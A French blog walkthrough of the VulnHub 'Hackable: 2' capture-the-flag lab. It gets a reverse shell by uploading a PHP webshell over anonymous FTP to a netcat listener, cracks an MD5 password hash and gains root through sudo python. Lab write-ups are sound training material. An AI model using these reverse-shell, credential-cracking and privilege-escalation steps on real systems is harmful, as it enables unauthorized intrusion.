<!DOCTYPE html>
<html data-html-server-rendered="true" lang="fr" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22fr%22%7D%7D">
  <head>
    <title>CTF Hackable: 2 - https://etienner.github.io</title><meta name="gridsome:hash" content="250f333e9ef0347f8247956a19dfdff7c411a751"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.23"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:type" content="article"><meta data-vue-tag="ssr" property="og:title" content="CTF Hackable: 2"><meta data-vue-tag="ssr" property="og:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:url" content="https://etienner.github.io/ctf-hackable-2/"><meta data-vue-tag="ssr" name="twitter:domain" content="https://etienner.github.io"><meta data-vue-tag="ssr" name="twitter:card" content="summary_large_image"><meta data-vue-tag="ssr" name="twitter:title" content="CTF Hackable: 2"><meta data-vue-tag="ssr" name="twitter:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" name="twitter:site" content="@etiennerouzeaud"><meta data-vue-tag="ssr" name="twitter:creator" content="@etiennerouzeaud"><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.9bb7ffafafc09ac851d81afb65b8ef59.png"><link rel="preload" href="/assets/css/0.styles.9275371b.css" as="style"><link rel="preload" href="/assets/js/app.8f509c54.js" as="script"><link rel="preload" href="/assets/js/page--src-templates-post-vue.12e71a8f.js" as="script"><link rel="prefetch" href="/assets/js/page--node-modules-gridsome-app-pages-404-vue.b64bd371.js"><link rel="prefetch" href="/assets/js/page--src-pages-index-vue.15f2a9bd.js"><link rel="prefetch" href="/assets/js/page--src-templates-tag-vue.25185cf5.js"><link rel="stylesheet" href="/assets/css/0.styles.9275371b.css"><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
  </head>
  <body >
    <div data-server-rendered="true" id="app"><header class="py-2 text-center"><strong><a href="/" title="Accueil" class="active">Etienne ROUZEAUD - D√©veloppeur Web</a></strong></header><main><div class="title py-2 text-center" data-v-2084d89c><h1 class="display-5 pt-2" data-v-2084d89c>CTF Hackable: 2</h1><!----></div><div class="container"><div class="row sidebar"><div class="mt-4 col-lg-2"><p><em><span>23 juin 2021</span></em></p><ul class="list-unstyled"><li>
            üè∑Ô∏è <a href="/tag/Pentest/">Pentest</a></li><li>
            üè∑Ô∏è <a href="/tag/CTF/">CTF</a></li><li>
            üè∑Ô∏è <a href="/tag/webshell/">webshell</a></li></ul><p>‚åö 5 mins de lecture</p><p><a href="https://www.vulnhub.com/entry/hackable-ii,711" target="_blank" rel="noopener">
            üíæ T√©l√©chargement
          </a></p></div><div class="col-lg-10 mt-4"><!----><article><h2>Avant propos</h2>
<p>Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propri√©taire.<br>
Ce CTF a √©t√© r√©alis√© avec une machine attaquante <strong>Kali 2021.2</strong> (<code class="language-text">lsb_release -r</code>).</p>
<h2>Enum√©ration</h2>
<p>On r√©cup√®re l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class="language-text">sudo netdiscover</code>.<br>
Avant de poursuivre, on exporte cette adresse dans une variable pour √™tre tranquille par la suite <code class="language-text">export IP=192.168.1.32</code>.<br>
Puis on cr√©√© un dossier d√©di√© √† ce CTF <code class="language-text">cd Documents/ctf &amp;&amp; mkdir Hackable2 &amp;&amp; cd Hackable2</code>.<br>
On lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ nmap -A -p- <span class="token variable">$IP</span> -oN nmap.txt
PORT   STATE SERVICE VERSION
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>     ProFTPD
<span class="token operator">|</span> ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code <span class="token number">230</span><span class="token punctuation">)</span>
<span class="token operator">|</span>_-rw-r--r--   <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>             <span class="token number">109</span> Nov <span class="token number">26</span>  <span class="token number">2020</span> CALL.html
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.2p2 Ubuntu 4ubuntu2.10 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> 2f:c6:2f:c4:6d:a6:f5:5b:c2:1b:f9:17:1f:9a:09:89 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> 5e:91:1b:6b:f1:d8:81:de:8b:2c:f3:70:61:ea:6f:29 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> f1:98:21:91:c8:ee:4d:a2:83:14:64:96:37:5b:44:3d <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.18 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-server-header: Apache/2.4.18 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>On a un serveur <strong>FTP</strong> sur le port <strong>21</strong>, un serveur <strong>SSH</strong> sur le port <strong>22</strong> et un serveur <strong>Apache</strong> 2.4.18 sur le port <strong>80</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">ftp</span> <span class="token variable">$IP</span>
Connected to <span class="token number">192.168</span>.1.32.
<span class="token number">220</span> ProFTPD Server <span class="token punctuation">(</span>ProFTPD Default Installation<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.1.32<span class="token punctuation">]</span>
Name <span class="token punctuation">(</span><span class="token number">192.168</span>.1.32:kali<span class="token punctuation">)</span>: anonymous
<span class="token number">331</span> Anonymous login ok, send your complete email address as your password
Password:
<span class="token number">230</span> Anonymous access granted, restrictions apply
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">></span> <span class="token function">ls</span> -la
<span class="token number">200</span> PORT <span class="token builtin class-name">command</span> successful
<span class="token number">150</span> Opening ASCII mode data connection <span class="token keyword">for</span> <span class="token function">file</span> list
drwxr-xrwx   <span class="token number">2</span> <span class="token number">33</span>       <span class="token number">33</span>           <span class="token number">4096</span> Nov <span class="token number">26</span>  <span class="token number">2020</span> <span class="token builtin class-name">.</span>
drwxr-xrwx   <span class="token number">2</span> <span class="token number">33</span>       <span class="token number">33</span>           <span class="token number">4096</span> Nov <span class="token number">26</span>  <span class="token number">2020</span> <span class="token punctuation">..</span>
-rw-r--r--   <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>             <span class="token number">109</span> Nov <span class="token number">26</span>  <span class="token number">2020</span> CALL.html
<span class="token number">226</span> Transfer complete
ftp<span class="token operator">></span> get CALL.html
local: CALL.html remote: CALL.html
<span class="token number">200</span> PORT <span class="token builtin class-name">command</span> successful
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> CALL.html <span class="token punctuation">(</span><span class="token number">109</span> bytes<span class="token punctuation">)</span>
<span class="token number">226</span> Transfer complete</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>On r√©cup√®re le fichier HTML.</p>
<div class="gridsome-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html">$ cat CALL.html                                      
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>onion<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>GET READY TO RECEIVE A CALL<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Rien d'int√©ressant dans le fichier HTML si ce n'est le message "GET READY TO RECEIVE A CALL"... On teste la s√©curit√© du serveur <strong>Apache</strong> avec <strong>Nikto</strong> dans un second onglet du terminal.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ nikto -h http://<span class="token variable">$IP</span> -o nikto.txt
+ Server: Apache/2.4.18 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="token keyword">in</span> a different fashion to the MIME <span class="token builtin class-name">type</span>
+ No CGI Directories found <span class="token punctuation">(</span>use <span class="token string">'-C all'</span> to force check all possible <span class="token function">dirs</span><span class="token punctuation">)</span>
+ Server may leak inodes via ETags, header found with <span class="token function">file</span> /, inode: 2be7, size: 5b504999e72a0, mtime: <span class="token function">gzip</span>
+ Apache/2.4.18 appears to be outdated <span class="token punctuation">(</span>current is at least Apache/2.4.37<span class="token punctuation">)</span>. Apache <span class="token number">2.2</span>.34 is the EOL <span class="token keyword">for</span> the <span class="token number">2</span>.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /files/: Directory indexing found.
+ OSVDB-3092: /files/: This might be interesting<span class="token punctuation">..</span>.
+ OSVDB-3233: /icons/README: Apache default <span class="token function">file</span> found.</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Dans le r√©p√©rtoire "files", on retrouve le fichier HTML pr√©sent dans le serveur <strong>FTP</strong>.</p>
<p>On pr√©pare le webshell pour l'uploader sur le serveur <strong>FTP</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cp</span> /usr/share/webshells/php/php-reverse-shell.php <span class="token builtin class-name">.</span>
$ <span class="token function">vim</span> php-reverse-shell.php
/<span class="token variable">$ip</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>Dans un troisi√®me onglet, lancez le serveur <strong>Netcat</strong> avec la commande <code class="language-text">nc -lnvp 1234</code>.</p>
<p>On retourne sur le serveur FTP pour y glisser notre webshell.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">ftp<span class="token operator">></span> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
<span class="token number">200</span> PORT <span class="token builtin class-name">command</span> successful
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> php-reverse-shell.php
<span class="token number">226</span> Transfer complete
<span class="token number">5494</span> bytes sent <span class="token keyword">in</span> <span class="token number">0.00</span> secs <span class="token punctuation">(</span><span class="token number">68.0453</span> MB/s<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>P√©n√©tration</h2>
<p>Dans le second onglet, la connexion au serveur <strong>Netcat</strong> est √©tablie.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ python3 -c <span class="token string">'import pty; pty.spawn("/bin/sh")'</span>
$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>Dans le fichier ".runme.sh" pr√©sent √† la racine du serveur, on trouve un nouvel utilisateur "shrek" et un mot de passe associ√© sous la forme d'une chaine de caract√®res en <strong>MD5</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">tail</span> /.runme.sh
shrek:cf4c2232354952690368f1b3dfdfb24d</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Apr√®s l'avoir d√©crypt√©e sur le Web, on trouve le couple login et mot de passe "shrek:onion"</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">su</span> shrek
Password: onion</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>On est connect√© avec ce nouvel utilisateur et on trouve le flag user dans le dossier de cet utilisateur <code class="language-text">cat /home/shrek/user.txt</code>.</p>
<h2>Escalation</h2>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">sudo</span> -l
Matching Defaults entries <span class="token keyword">for</span> shrek on ubuntu:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin

User shrek may run the following commands on ubuntu:
    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/python3.5</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Cet utilisateur a des privil√®ges <code class="language-text">sudo</code> avec la commande <code class="language-text">python3.5</code>.</p>
<p>Sur <a href="https://gtfobins.github.io/gtfobins/python/#sudo" target="_blank" rel="nofollow noopener noreferrer">GTFOBins</a>, on trouve facilement la commande pour √™tre root de la machine avec <code class="language-text">sudo</code>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">sudo</span> python3.5 -c <span class="token string">'import os; os.system("/bin/sh")'</span>
$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>On trouve le flag root dans le dossier <code class="language-text">cat /root/root.txt</code>.</p>
</article></div></div></div></main><footer class="text-white mt-4"><ul class="nav nav-pills justify-content-center"><li><a href="https://github.com/etienner" target="_blank" rel="noopener" class="nav-link">Github</a></li><li><a href="https://medium.com/@etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Medium</a></li><li><a href="https://twitter.com/etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Twitter</a></li></ul></footer></div>
    <script>window.__INITIAL_STATE__={"data":{"post":{"title":"CTF Hackable: 2","date":"23 June 2021","content":"\u003Ch2\u003EAvant propos\u003C\u002Fh2\u003E\n\u003Cp\u003ELe d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propri√©taire.\u003Cbr\u003E\nCe CTF a √©t√© r√©alis√© avec une machine attaquante \u003Cstrong\u003EKali 2021.2\u003C\u002Fstrong\u003E (\u003Ccode class=\"language-text\"\u003Elsb_release -r\u003C\u002Fcode\u003E).\u003C\u002Fp\u003E\n\u003Ch2\u003EEnum√©ration\u003C\u002Fh2\u003E\n\u003Cp\u003EOn r√©cup√®re l'adresse IP de la machine distante avec \u003Cstrong\u003ENetdiscover\u003C\u002Fstrong\u003E \u003Ccode class=\"language-text\"\u003Esudo netdiscover\u003C\u002Fcode\u003E.\u003Cbr\u003E\nAvant de poursuivre, on exporte cette adresse dans une variable pour √™tre tranquille par la suite \u003Ccode class=\"language-text\"\u003Eexport IP=192.168.1.32\u003C\u002Fcode\u003E.\u003Cbr\u003E\nPuis on cr√©√© un dossier d√©di√© √† ce CTF \u003Ccode class=\"language-text\"\u003Ecd Documents\u002Fctf &amp;&amp; mkdir Hackable2 &amp;&amp; cd Hackable2\u003C\u002Fcode\u003E.\u003Cbr\u003E\nOn lance \u003Cstrong\u003ENmap\u003C\u002Fstrong\u003E pour scanner les ports de la machine distante.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ nmap -A -p- \u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E -oN nmap.txt\nPORT   STATE SERVICE VERSION\n\u003Cspan class=\"token number\"\u003E21\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  \u003Cspan class=\"token function\"\u003Eftp\u003C\u002Fspan\u003E     ProFTPD\n\u003Cspan class=\"token operator\"\u003E|\u003C\u002Fspan\u003E ftp-anon: Anonymous FTP login allowed \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EFTP code \u003Cspan class=\"token number\"\u003E230\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token operator\"\u003E|\u003C\u002Fspan\u003E_-rw-r--r--   \u003Cspan class=\"token number\"\u003E1\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E        \u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E             \u003Cspan class=\"token number\"\u003E109\u003C\u002Fspan\u003E Nov \u003Cspan class=\"token number\"\u003E26\u003C\u002Fspan\u003E  \u003Cspan class=\"token number\"\u003E2020\u003C\u002Fspan\u003E CALL.html\n\u003Cspan class=\"token number\"\u003E22\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  \u003Cspan class=\"token function\"\u003Essh\u003C\u002Fspan\u003E     OpenSSH \u003Cspan class=\"token number\"\u003E7\u003C\u002Fspan\u003E.2p2 Ubuntu 4ubuntu2.10 \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EUbuntu Linux\u003Cspan class=\"token punctuation\"\u003E;\u003C\u002Fspan\u003E protocol \u003Cspan class=\"token number\"\u003E2.0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token operator\"\u003E|\u003C\u002Fspan\u003E ssh-hostkey: \n\u003Cspan class=\"token operator\"\u003E|\u003C\u002Fspan\u003E   \u003Cspan class=\"token number\"\u003E2048\u003C\u002Fspan\u003E 2f:c6:2f:c4:6d:a6:f5:5b:c2:1b:f9:17:1f:9a:09:89 \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003ERSA\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token operator\"\u003E|\u003C\u002Fspan\u003E   \u003Cspan class=\"token number\"\u003E256\u003C\u002Fspan\u003E 5e:91:1b:6b:f1:d8:81:de:8b:2c:f3:70:61:ea:6f:29 \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EECDSA\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token operator\"\u003E|\u003C\u002Fspan\u003E_  \u003Cspan class=\"token number\"\u003E256\u003C\u002Fspan\u003E f1:98:21:91:c8:ee:4d:a2:83:14:64:96:37:5b:44:3d \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EED25519\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E80\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  http    Apache httpd \u003Cspan class=\"token number\"\u003E2.4\u003C\u002Fspan\u003E.18 \u003Cspan class=\"token variable\"\u003E\u003Cspan class=\"token punctuation\"\u003E((\u003C\u002Fspan\u003EUbuntu\u003Cspan class=\"token punctuation\"\u003E))\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\u003Cspan class=\"token operator\"\u003E|\u003C\u002Fspan\u003E_http-server-header: Apache\u002F2.4.18 \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EUbuntu\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token operator\"\u003E|\u003C\u002Fspan\u003E_http-title: Apache2 Ubuntu Default Page: It works\nService Info: OS: Linux\u003Cspan class=\"token punctuation\"\u003E;\u003C\u002Fspan\u003E CPE: cpe:\u002Fo:linux:linux_kernel\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn a un serveur \u003Cstrong\u003EFTP\u003C\u002Fstrong\u003E sur le port \u003Cstrong\u003E21\u003C\u002Fstrong\u003E, un serveur \u003Cstrong\u003ESSH\u003C\u002Fstrong\u003E sur le port \u003Cstrong\u003E22\u003C\u002Fstrong\u003E et un serveur \u003Cstrong\u003EApache\u003C\u002Fstrong\u003E 2.4.18 sur le port \u003Cstrong\u003E80\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Eftp\u003C\u002Fspan\u003E \u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E\nConnected to \u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.32.\n\u003Cspan class=\"token number\"\u003E220\u003C\u002Fspan\u003E ProFTPD Server \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EProFTPD Default Installation\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.32\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\nName \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.32:kali\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E: anonymous\n\u003Cspan class=\"token number\"\u003E331\u003C\u002Fspan\u003E Anonymous login ok, send your complete email address as your password\nPassword:\n\u003Cspan class=\"token number\"\u003E230\u003C\u002Fspan\u003E Anonymous access granted, restrictions apply\nRemote system \u003Cspan class=\"token builtin class-name\"\u003Etype\u003C\u002Fspan\u003E is UNIX.\nUsing binary mode to transfer files.\nftp\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token function\"\u003Els\u003C\u002Fspan\u003E -la\n\u003Cspan class=\"token number\"\u003E200\u003C\u002Fspan\u003E PORT \u003Cspan class=\"token builtin class-name\"\u003Ecommand\u003C\u002Fspan\u003E successful\n\u003Cspan class=\"token number\"\u003E150\u003C\u002Fspan\u003E Opening ASCII mode data connection \u003Cspan class=\"token keyword\"\u003Efor\u003C\u002Fspan\u003E \u003Cspan class=\"token function\"\u003Efile\u003C\u002Fspan\u003E list\ndrwxr-xrwx   \u003Cspan class=\"token number\"\u003E2\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E33\u003C\u002Fspan\u003E       \u003Cspan class=\"token number\"\u003E33\u003C\u002Fspan\u003E           \u003Cspan class=\"token number\"\u003E4096\u003C\u002Fspan\u003E Nov \u003Cspan class=\"token number\"\u003E26\u003C\u002Fspan\u003E  \u003Cspan class=\"token number\"\u003E2020\u003C\u002Fspan\u003E \u003Cspan class=\"token builtin class-name\"\u003E.\u003C\u002Fspan\u003E\ndrwxr-xrwx   \u003Cspan class=\"token number\"\u003E2\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E33\u003C\u002Fspan\u003E       \u003Cspan class=\"token 